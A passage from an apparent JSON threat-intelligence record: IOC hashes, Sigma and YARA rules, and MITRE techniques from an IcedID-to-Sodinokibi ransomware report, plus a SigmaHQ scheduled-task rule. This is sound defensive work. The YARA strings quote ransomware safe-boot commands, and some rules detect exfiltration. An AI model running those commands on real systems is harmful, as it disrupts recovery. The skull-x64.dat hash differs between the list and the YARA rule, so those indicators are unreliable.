File\n\n```\nskull-x64.dat\n5c3a6978bb960d8fbccd117ddcc3ca10\n17424cfeb756e231bea6d1363151a83af142ba6f\n59a2a5fae1c51afbbf1b8c6eb0a65cb2b8575794e3890f499f8935035e633fc\nCiocca.dll\n296f1098a3a8cfb7e07808ee08361495\n7d903f87fd305f1c93ec420848fd6e5aeb018d59\nb1b00f7b065e8c013e0c23c0f34707819e0d537dbe2e83d0d023a11a0ca6b388\nlicense.dat\n6f208841cfd819c29a7cbc0a202bd7a3\n0febc376cc066bb668f1a80b969ed112da8e871c\n45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865\nDomainName.dll\nc8fab46c4fd61c5f138fb151638c35e1\nc4830cbf3a3044f6e50cd60127ff5681f8ee4bbf\n64076294e761cee0ce7d7cd28dae05f483a711eafe47f94fe881ac3980abfd8f\nDomainName.exe\naf94ccb62f97700115a219c4b7626d22\nbb67edcfe4e5b6fe09ee96e5b8ace7a4cfe39eb7\n2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\nsvchost.exe (rclone)\nfcfcf1e45e8d5cdca0450b8dc90754b68e8e4673\n538078ab6d80d7cf889af3e08f62c4e83358596f31ac8ae8fbc6326839a6bfe5\nAdFind.exe\ncb198869ca3c96af536869e71c54dd9d83afbee6\n56de41fa0a94fa7fff68f02712a698ba2f0a71afcecb217f6519bd5751baf3ed\n```\n\n### Detections\n\n#### Network\n\n```\nETPRO TROJAN Cobalt Strike Malleable C2 JQuery Custom Profile M2\nET DNS Query to a *.top domain\nET POLICY OpenSSL Demo CA - Internet Widgits Pty\n```\n\n#### Sigma\n\n- Suspicious PowerShell Encoded Command\n- Trickbot Recon Activity\n- Suspicious Commands Recon Activity\n- Rundll32 Net Connections\n- BITSAdmin Download\n- Suspicious AdFind\n- Suspicious WMI Execution\n- Office Shell\n\nCustom rule thanks to @0xThiebaut:\n\n```\ntitle: Sodinokibi Ransomware Registry Key\nid: 9fecd354-77f0-498e-a611-c963970e7bca\ndescription: Detects the creation of Sodinokibi (aka REvil) registry keys\nstatus: experimental\nreferences:\n  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n  - https://twitter.com/malwrhunterteam/status/1372648463553462279\ntags:\n  - attack.persistence\n  - attack.t1547.001\ndate: 2021/03/29\nauthor: Maxime THIEBAUT (@0xThiebaut)\nlogsource:\n  category: registry_event\n  product: windows\ndetection:\n  selection:\n    TargetObject|contains:\n      - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*AstraZeneca'\n      - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*franceisshit'\ncondition: selection\nlevel: high\n```\n\nCustom rule thanks to @lindodapoet_:\n\n```\ntitle: Svchost data exfiltration\nid: dc4249c9-d96f-401b-a92b-caa6208c097d\nstatus: experimental\ndescription: Detects possible data exfiltration via svchost\nreferences:\n  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\nauthor: Nclose\ndate: 2021/03/29\ntags:\n  - attack.exfiltration\n  - attack.t1048\nlogsource:\n  product: windows\n  service: process_creation\ndetection:\n  selection:\n    CommandLine|contains: 'copy'\n    Image|endswith: '\\svchost.exe'\ncondition: selection\nfalsepositives:\n  - Unknown\nlevel: high\n```\n\n### Custom rules and rule ideas_Ransomware.yaml) written by @BlackMatter23.\n\n### Yara\n\n```\n/*\nYARA Rule Set\nAuthor: The DFIR Report\nDate: 2021-03-29\nIdentifier: files\nReference: https://thedfirreport.com\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\nrule Sodinokibi_032021 {\nmeta:\n  description = \"files - file DomainName.exe\"\n  author = \"The DFIR Report\"\n  reference = \"https://thedfirreport.com\"\n  date = \"2021-03-21\"\n  hash1 = \"2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\"\nstrings:\n  $s1 = \"vmcompute.exe\" fullword wide\n  $s2 = \"vmwp.exe\" fullword wide\n  $s3 = \"bootcfg /raw /a /safeboot:network /id 1\" fullword ascii\n  $s4 = \"bcdedit /set {current} safeboot network\" fullword ascii\n  $s5 = \"7+a@P>:N:0!F$%I-6MBEFb M\" fullword ascii\n  $s6 = \"jg:\\\"\\\\0=Z\" fullword ascii\n  $s7 = \"ERR0R D0UBLE RUN!\" fullword wide\n  $s8 = \"VVVVVPQ\" fullword ascii\n  $s9 = \"VVVVVWQ\" fullword ascii\n  $s10 = \"Running\" fullword wide /* Goodware String - occured 159 times */\n  $s11 = \"expand 32-byte kexpand 16-byte k\" fullword ascii\n  $s12 = \"9RFIT\\\"&\"\n  $s13 = \"jZXVf9F\" fullword ascii\n  $s14 = \"tCWWWhS=@\" fullword ascii\n  $s15 = \"vmms.exe\" fullword wide /* Goodware String - occured 1 times */\n  $s16 = \"JJwK9Zl\" fullword ascii\n  $s17 = \"KkT37uf4nNh2PqUDwZqxcHUMVV3yBwSHO#K\" fullword ascii\n  $s18 = \"0*090}0\" fullword ascii /* Goodware String - occured 1 times */\n  $s19 = \"5)5I5a5\" fullword ascii /* Goodware String - occured 1 times */\n  $s20 = \"7-7H7c7\" fullword ascii /* Goodware String - occured 1 times */\ncondition:\n  uint16(0) == 0x5a4d and filesize < 400KB and\n  ( pe.imphash() == \"031931d2f2d921a9d906454d42f21be0\" or 8 of them )\n}\n\nrule icedid_032021_1 {\nmeta:\n  description = \"files - file skull-x64.dat\"\n  author = \"The DFIR Report\"\n  reference = \"https://thedfirreport.com\"\n  date = \"2021-03-21\"\n  hash1 = \"59a2a5fae1c51afbbf1bf8c6eb0a65cb2b8575794e3890f499f8935035e633fc\"\nstrings:\n  $s1 = \"update\" fullword ascii /* Goodware String - occured 207 times */\n  $s2 = \"PstmStr\" fullword ascii\n  $s3 = \"mRsx0k/\" fullword wide\n  $s4 = \"D$0lzK\" fullword ascii\n  $s5 = \"A;Zts}H\" fullword ascii\ncondition:\n  uint16(0) == 0x5a4d and filesize < 100KB and\n  ( pe.imphash() == \"67a065c05a359d287f1fed9e91f823d5\" and ( pe.exports(\"PstmStr\") and pe.exports(\"update\") ) or all of them )\n}\n\nrule icedid_032021_2 {\nmeta:\n  description = \"1 - file license.dat\"\n  author = \"The DFIR Report\"\n  reference = \"https://thedfirreport.com\"\n  date = \"2021-03-21\"\n  hash1 = \"45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865\"\nstrings:\n  $s1 = \"+ M:{`n-\" fullword ascii\n  $s2 = \"kwzzdd\" fullword ascii\n  $s3 = \"w5O- >z\" fullword ascii\n  $s4 = \"RRlK8n@~\" fullword ascii\ncondition:\n  uint16(0) == 0x43da and filesize < 1000KB and\n  8 of them\n}\n```\n\n### MITRE\n\n```\nSpearphishing Attachment - T1566.001\nUser Execution - T1204\nWindows Management Instrumentation - T1047\nProcess Injection - T1055\nDomain Trust Discovery - T1482\nDomain Account - T1087.002\nSystem Information Discovery - T1082\nSystem Network Configuration Discovery - T1016\nSecurity Software Discovery - T1518.001\nSMB/Windows Admin Shares - T1021.002\nRemote Desktop Protocol - T1021.001\nCommonly Used Port - T1043\nApplication Layer Protocol - T1071\nExfiltration Over Asymmetric Encrypted Non-C2 Protocol - T1048.002\nData Encrypted for Impact - T1486\nMalicious File - T1204.002\nCommand and Scripting Interpreter - T1059\nPowerShell - T1059.001\nScheduled Task - T1053.005\nRemote System Discovery - T1018\nRundll32 - T1218.011\n```",
    "sigma_rule": {
      "title": "Scheduled TaskCache Change by Uncommon Program",
      "id": "4720b7df-40c3-48fd-bbdf-fd4b3c464f0d",
      "status": "test",
      "description": "Monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://web.archive.org/web/20221112001212/https://labs.withsecure.com/publications/scheduled-task-tampering"
      ],
      "author": "Syed Hasan (@syedhasan009)",
      "date": "2021-06-18",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1053",
        "attack.t1053.005"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\"
        },
        "filter": {
          "TargetObject|contains": [
            "Microsoft\\Windows\\UpdateOrchestrator",
            "Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask\\Index",
            "Microsoft\\Windows\\Flighting\\OneSettings\\RefreshCache\\Index"
          ]
        },
        "filter_tiworker": {
          "Image|startswith": "C:\\Windows\\",
          "Image|endswith": "\\TiWorker.exe"
        },
        "filter_svchost": {
          "Image": "C:\\WINDOWS\\system32\\svchost.exe"
        },
        "filter_ngen": {
          "Image|startswith": "C:\\Windows\\Microsoft.NET\\Framework",
          "Image|endswith": "\\ngen.exe",
          "TargetObject|contains": [
            "\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{B66B135D-DA06-4FC4-95F8-7458E1D10129}",
            "\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN"
          ]
        },
        "filter_office_click_to_run": {
          "Image": [
            "C:\\Program Files\\Microsoft Office\\root\\Integration\\Integrator.exe",
            "C:\\Program Files (x86)\\Microsoft Office\\root\\Integration\\Integrator.exe"
          ]
        },
        "filter_msiexec": {
          "Image": "C:\\Windows\\System32\\msiexec.exe"
        },
        "filter_dropbox_updater": {
          "Image": [
            "C:\\Program Files (x86)\\Dropbox\\Update\\DropboxUpdate.exe",
            "C:\\Program Files\\Dropbox\\Update\\DropboxUpdate.exe"
          ]
        },
        "filter_explorer": {
          "Image": "C:\\Windows\\explorer.exe",
          "TargetObject|contains": "\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\\"
        },
        "filter_system": {
          "Image": "System"
        },
        "condition": "selection and not 1 of filter*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_taskcache_entry.yml",
    "id": "1024"
  }
]